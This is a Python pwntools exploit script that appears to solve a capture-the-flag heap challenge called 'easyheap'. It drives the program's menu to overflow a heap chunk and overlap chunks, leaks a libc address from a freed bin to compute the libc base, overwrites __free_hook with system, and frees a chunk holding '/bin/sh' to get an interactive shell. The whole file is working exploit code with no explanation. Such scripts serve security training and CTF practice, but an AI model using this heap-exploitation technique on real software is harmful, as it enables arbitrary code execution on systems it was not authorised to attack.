#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context(log_level='debug')

p = process('./easyheap')
#p = remote('127.0.0.1',10001)


def create(size,string):
	p.recvuntil('Choice:')
	p.sendline('1')
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Content:\n')
	p.send(string)

def edit(id,size,string):
	p.recvuntil('Choice:')
	p.sendline('2')
	p.recvuntil('id:')
	p.sendline(str(id))
	p.recvuntil('Size:')
	p.sendline(str(size))
	p.recvuntil('Content:\n')
	p.send(string)

def list():
	p.recvuntil('Choice:')
	p.sendline('3')	


def remove(id):
	p.recvuntil('Choice:')
	p.sendline('4')
	p.recvuntil('id:')
	p.sendline(str(id))

def launch_gdb():
	context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
	gdb.attach(proc.pidof(p)[0])




create(0x60,'a'*(0x60))#0
create(0x200, p64(0x130)*64)#1
create(0x200, '\n')#2
create(0x200, '\n')#3
create(0x200, '\n')#4
create(0x200, '\n')#5
create(0x200, '\n')#6
create(0x200, '\n')#7
remove(1)    #free chunk1
create(0x40, 'b'*0x40)  #chunk1
create(0x100, 'c'*0x100) #chunk8

payload1 =  'd'* 0x60 + p64(0) + p64(0x20) + p64(0) * 2 + p64(0) + p64(130)
edit(0,len(payload1),payload1)
remove(1)   #free chunk1
remove(2)   #free chunk2

create(0x80, '\n')   #chunk1

list()
p.recvuntil('id:1,size:128,content:')
data =  u64(p.recvuntil('id')[:-2].ljust(8,'\x00')) - 0xa000000000000
print hex(data)
bin_offset = 0x3C4b78
libc_base = data - bin_offset
print hex(libc_base)
libc = ELF('./libc.so.6')
free_hook_offset = 0x00000000003c67a8
system_offset = 0x45390
system_addr = libc_base + system_offset
print hex(system_addr)
free_hook_addr = libc_base+free_hook_offset
payload = "/bin/sh"
payload +="\x00"*(0x200-len(payload))+p64(0)+p64(0x21)+p64(0x211)+p64(free_hook_addr)

edit(6,len(payload),payload)
payload = system_addr
edit(7,8,p64(system_addr))
launch_gdb()
remove(6)


p.interactive()